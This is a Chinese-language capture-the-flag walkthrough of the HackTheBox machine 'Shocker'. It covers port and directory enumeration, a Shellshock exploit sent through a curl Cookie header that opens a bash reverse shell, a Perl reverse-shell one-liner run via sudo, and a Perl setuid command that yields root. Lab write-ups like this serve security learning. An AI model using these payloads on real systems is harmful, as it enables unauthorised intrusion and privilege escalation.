# shocker

- **shocker**是hackthebox上的一台靶机

### 信息收集

- nmap查看端口以及漏洞

![image-20211012001541688](http://cdn.mxrblog.cn/image-20211012001541688.png)

- 靶机开启了80端口，使用浏览器查看一下：

![image-20211012203221880](http://cdn.mxrblog.cn/image-20211012203221880.png)

- 网页上只显示了一张图像，没有其他的线索，使用dirsearch查看目录
- 第一次查看发现目录cgi-bin有东西，第二次进一步检索，发现该目录里有可执行文件user.sh

![image-20211012205731556](http://cdn.mxrblog.cn/image-20211012205731556.png)

- 使用工具curl查看user.sh的内容

![image-20211012210545863](http://cdn.mxrblog.cn/image-20211012210545863.png)

- 尝试向user.sh这个可执行脚本文件中发送反弹shell的代码,并在靶机上nc监听

`curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.23/4443 0>&1' http://10.10.10.56/cgi-bin/user.sh`

![image-20211012211112986](http://cdn.mxrblog.cn/image-20211012211112986.png)

![image-20211012211127541](http://cdn.mxrblog.cn/image-20211012211127541.png)

- user.sh文件是需要root权限才能够执行，我们需要从其他地方下手
- 使用sudo -l 来查看是否有当前用户能够执行root权限的行动

![image-20211012213008319](http://cdn.mxrblog.cn/image-20211012213008319.png)

- 可以使用perl语言进行反弹shell

```
perl -e 'use Socket;$i="10.10.14.23";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![image-20211012213717937](http://cdn.mxrblog.cn/image-20211012213717937.png)

![image-20211012213800327](http://cdn.mxrblog.cn/image-20211012213800327.png)



- 得到user.txt 和root.txt

![image-20211012213913480](http://cdn.mxrblog.cn/image-20211012213913480.png)

![image-20211012214052223](http://cdn.mxrblog.cn/image-20211012214052223.png)

- 或者使用以下perl命令获得root shell

```
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

![image-20211012214435236](http://cdn.mxrblog.cn/image-20211012214435236.png)
